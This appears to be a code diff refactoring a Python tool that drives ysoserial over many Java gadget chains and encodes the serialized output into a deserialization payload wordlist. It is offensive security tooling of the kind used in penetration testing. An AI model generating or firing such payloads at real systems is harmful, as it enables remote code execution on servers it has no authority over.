@@ -4,83 +4,84 @@ import argparse
 import logging
 import sys
 import urllib.parse
+import zlib
 from pathlib import Path
-from subprocess import check_output
+from subprocess import check_output, PIPE, Popen
 
 
 # Sets the default output file name if optional param is not set #
 DEFAULT_OUT_FILE = 'ss_wordlist.txt'
 
 
-def url_exec(input_str: str) -> str:
+def url_exec(input_bytes: bytes) -> bytes:
     """
     Url encodes the passed in input string and returns.
 
-    :param input_str:  The string to be URL encoded.
+    :param input_bytes:  The string to be URL encoded.
     :return:  The URL encoded string.
     """
     # Return the passed in string as url-encoded #
-    return urllib.parse.quote_plus(input_str)
+    return urllib.parse.quote_plus(input_bytes).encode()
 
 
-def ascii_hex_exec(input_str: str) -> str:
+def ascii_hex_exec(input_bytes: bytes) -> bytes:
     """
     Hex encodes the passed in input string and returns.
 
-    :param input_str:  The string to be hex encoded.
+    :param input_bytes:  The string to be hex encoded.
     :return:  The hex encoded string.
     """
     # Return the passed in string as hex #
-    return input_str.encode(errors='replace').hex()
+    return input_bytes.hex().encode()
 
 
-def base64_url_exec(input_str: str) -> str:
+def base64_url_exec(input_bytes: bytes) -> bytes:
     """
     Base64 URL encodes the passed in input string and returns.
 
-    :param input_str:  The string to be Base64 URL encoded.
+    :param input_bytes:  The string to be Base64 URL encoded.
     :return:  The Base64 URL encoded string.
     """
     # Encode input string as base64 #
-    base64_out = check_output(f'echo {input_str} | base64', encoding='utf-8')
+    base64_out = sys_cmd(['base64'], input_bytes)
     # Return the Url encoded base64 output #
-    return urllib.parse.quote_plus(base64_out)
+    return url_exec(base64_out)
 
 
-def base64_exec(input_str: str) -> str:
+def base64_exec(input_bytes: bytes) -> bytes:
     """
     Base64 encodes the passed in input string and returns.
 
-    :param input_str:  The string to be Base64 encoded.
+    :param input_bytes:  The string to be Base64 encoded.
     :return:  The Base64 encoded string.
     """
     # Return the passed in string as base64 encoded #
-    return check_output(f'echo {input_str} | base64', encoding='utf-8')
+    return sys_cmd(['base64'], input_bytes)
 
 
-def zlib_exec(input_str: str):
+def zlib_exec(input_bytes: bytes) -> bytes:
     """
     Zlib compresses the passed in input string and returns.
 
-    :param input_str:  The string to be zlib compressed.
+    :param input_bytes:  The string to be zlib compressed.
     :return:  The compressed zlib data.
     """
     # Return the passed in string as compressed zlib data #
-    return check_output(f'echo {input_str} | gzip', encoding='utf-8')
+    return zlib.compress(input_bytes)
 
 
-def gzip_exec(input_str: str):
+def gunzip_exec(input_bytes: bytes) -> bytes:
     """
     Gunzip compresses the passed in input string and returns.
 
-    :param input_str:
-    :return:
+    :param input_bytes:  The string to be gunzip compressed.
+    :return:  The compressed gunzip data.
     """
     # Return the passed in string as gzip compressed data #
-    return check_output(f'echo {input_str} | gunzip', encoding='utf-8')
+    return sys_cmd(['gzip', '-c'], input_bytes)
 
 
-def out_chain_gen(java_data: str, config_obj: object) -> str:
+def out_chain_gen(java_data: bytes, config_obj: object) -> bytes:
     """
     The raw serialized java data to run through the specified compression/encoding routines.
 
@@ -99,10 +100,31 @@ def out_chain_gen(java_data: str, config_obj: object) -> str:
 
         # If attempting to access key that does not exist #
         except KeyError:
-            # Ignore & re-iterate #
-            continue
+            pass
 
     return chain_out
+
+
+def sys_cmd(cmd_syntax: list, input_bytes: bytes):
+    """
+    Executes system command as child process with input bytes piped into it.
+
+    :param cmd_syntax:  The syntax for the command to be executed.
+    :param input_bytes:  The byte data to be feed into the child process via pipe.
+    :return:  The command output on success, raises error to log and exit on failure.
+    """
+    # Execute system command as child process with input bytes passed in through pipe #
+    with Popen(cmd_syntax, stdin=PIPE, stdout=PIPE, stderr=PIPE) as process:
+        stdout, stderr = process.communicate(input_bytes)
+
+    # If command error occurred #
+    if stderr:
+        # Print error, log, and exit #
+        print_err(f'Error occurred during command execution: {stderr}')
+        logging.error('Error occurred during command execution: %s', stderr)
+        sys.exit(3)
+
+    return stdout
 
 
 def main(config_obj: object):
@@ -114,26 +136,21 @@ def main(config_obj: object):
     :return:  Nothing
     """
     try:
-        # Open the output wordlist in append mode #
-        with config_obj.out_file.open('a', encoding='utf-8') as out_file:
+        # Open the output wordlist in append bytes mode #
+        with config_obj.out_file.open('ab') as out_file:
             # Iterate through the tuple of ysoserial library names #
             for library in config_obj.ysoserial_libs:
-                print('break1')
-
+                print(f'[+] Executing ysoserial {library} ', end='')
                 # Execute ysoserial with current iteration library and the specified payload #
                 ysoserial_out = check_output([config_obj.java_path, '-jar',
                                               str(config_obj.ysoserial_path), library,
-                                              f'{config_obj.payload}'], encoding='utf-8')
-
-                print('break2')
-
+                                              config_obj.payload])
+                print(f'=> Output chain: {config_obj.chain_reference}')
                 # Pass the serialized data to the output compression/encoding chain #
                 serial_payload = out_chain_gen(ysoserial_out, config_obj)
-
-                print('break3')
-
+                print(f'[!] {library} payload complete\n')
                 # Write the final payload to the output file #
-                out_file.write(serial_payload)
+                out_file.write(serial_payload + b'\n')
 
     # If error occurs during file operating #
     except OSError as file_err:
@@ -162,17 +179,18 @@ class ProgramConfig:
         self.cwd = Path.cwd()
         self.ysoserial_path = None
         self.payload = None
+        self.chain_reference = None
         self.out_chain = None
-        self.ysoserial_libs = ('AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure',
-                               'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
-                               'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5',
-                               'CommonsCollections6', 'CommonsCollections7', 'FileUpload1',
-                               'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1',
-                               'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
-                               'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2',
-                               'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1')
+        self.ysoserial_libs = ('BeanShell1', 'C3P0', 'Click1', 'CommonsBeanutils1',
+                               'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
+                               'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6',
+                               'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2',
+                               'JBossInterceptors1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1',
+                               'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1',
+                               'Spring2', 'Vaadin1')
         self.out_file = None
-        self.routines = {'gzip': gzip_exec, 'zlib': zlib_exec, 'base64': base64_exec,
+        # Map compression/encoding function references to their corresponding key #
+        self.routines = {'gzip': gunzip_exec, 'zlib': zlib_exec, 'base64': base64_exec,
                          'base64-url': base64_url_exec, 'ascii-hex': ascii_hex_exec,
                          'url': url_exec}
         # Confirm that Java exists on the system with the which command #
@@ -209,27 +227,37 @@ class ProgramConfig:
         if not file_path.is_absolute():
             # If the string path starts with a period specifying current directory #
             if string_path[:1] == '.':
-                # Rewrite string without period using index slicing #
-                string_path = string_path[2:]
-                # Format the path based on the current directory #
-                file_path = self.cwd / string_path
-                # Make sure parent directory and its ancestors are created #
-                file_path.parent.mkdir(parents=True, exist_ok=True)
-
+                # Parse the current working directory as base path and create any dirs in path #
+                file_path = self.path_parse(string_path, self.cwd)
             # If the string path starts with a tilde specifying the users home directory #
             elif string_path[:1] == '~':
-                # Rewrite string without tilde using index slicing #
-                string_path = string_path[2:]
-                # Format the path based on the users home directory #
-                file_path = Path.home() / string_path
-                # Make sure parent directory and its ancestors are created #
-                file_path.parent.mkdir(parents=True, exist_ok=True)
-
+                # Parse the current working directory as home path and create any dirs in path #
+                file_path = self.path_parse(string_path, Path.home())
             # If the input is not of correct format #
             else:
                 # Print error and exit #
                 print_err(f'Error occurred parsing the file path: {file_path}')
                 sys.exit(2)
+
+        return file_path
+
+    @staticmethod
+    def path_parse(string_path: str, base_path: Path) -> Path:
+        """
+        Takes the input string and base path and trims the first to characters (./, .\\, ~/, etc.).
+        The result is then reformatted to the based in base path and any parent directories in the
+        path are created.
+
+        :param string_path:  The old path to be trimmed and reformatted.
+        :param base_path:  The base path that the string path with be appended to.
+        :return:  The newly formatted pathlib instance.
+        """
+        # Rewrite string without tilde using index slicing #
+        string_parse = string_path[2:]
+        # Format the path based on the users home directory #
+        file_path = base_path / string_parse
+        # Make sure parent directory and its ancestors are created #
+        file_path.parent.mkdir(parents=True, exist_ok=True)
 
         return file_path
 
@@ -255,6 +283,7 @@ class ProgramConfig:
                       'or faulty inputs have been filtered out')
             sys.exit(2)
 
+        self.chain_reference = parsed_chain
         self.out_chain = filtered_methods
 
 
@@ -303,10 +332,6 @@ if __name__ == '__main__':
 
     # If unexpected exception occurs during program operation #
     except Exception as err:
-        # TODO: delete after dev
-        import traceback
-        traceback.print_exc()
-
         # Print, log error and set erroneous exit code #
         print_err(f'Unexpected exception occurred: {err}')
         logging.exception('Unexpected exception occurred: %s', err)
